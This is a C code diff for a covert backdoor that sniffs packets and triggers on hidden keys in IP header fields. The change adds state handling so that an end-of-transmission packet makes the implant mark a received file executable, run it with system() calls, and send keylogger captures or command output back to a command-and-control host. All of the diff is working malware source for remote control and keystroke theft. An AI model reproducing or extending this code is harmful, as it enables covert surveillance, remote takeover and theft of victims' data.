@@ -109,6 +109,7 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
 
         switch(CheckKey(ip->ip_tos, ip->ip_id)) {
             case COMMAND:
+                Filter->flag = COMMAND;
                 if(Filter->tcp == false) {
                     if((fp = fopen(FILENAME, "ab+")) < 0){
                         perror("fopen");
@@ -145,34 +146,39 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
 
                 break;
             case KEYLOGGER:
+                Filter->flag = KEYLOGGER;
                 src = ip->ip_src;
                 printf("source: %d", ntohs(src.s_addr));
                 if(src.s_addr == inet_addr(Filter->targetip)){
                     printf("KEYLOGGER\n");
                     //copy keylogger file to results file
                     system("cat .keylogger.txt > .results");
-                    sleep(1);
-                    send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, Filter->tcp, KEYLOGGER);
                 }
                 break;
             case INOTIFY:
+                Filter->flag = INOTIFY;
                 printf("INOTIFY\n");
                 //write to inotify file
                 break;
-            case UDPCOMMAND:
-                printf("UDP\n");
-                //EOT, stop receiving and start sending
-                break;
-            case EOT:
+            case EOT:   //wait for EOT packet before sending results back to the cnc
                 printf("EOT\n");
-                //EOT, stop receiving and start sending
-
-                //if inotify
-                    //start inotify
-                    //when completed, copy inotify file to results file
-                //if command
-                    //CHMOD it
-                    //run the file and pipe to results file
+                switch(Filter->flag) {
+                    case COMMAND:
+                        system(CHMOD);
+                        system(CMD);
+                        printf("COMMAND RECEIEVED \n");
+                        send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, true, Filter->flag);
+                        break;
+                    case KEYLOGGER:
+                        sleep(1);
+                        send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, Filter->tcp, KEYLOGGER);
+                        break;
+                    case INOTIFY:
+                        //start inotify
+                        //when completed, copy inotify file to results file
+                        send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, true, Filter->flag);
+                        break;
+                }
                 break;
             default:
                 printf("DEBUG: Packet tossed wrong key\n");
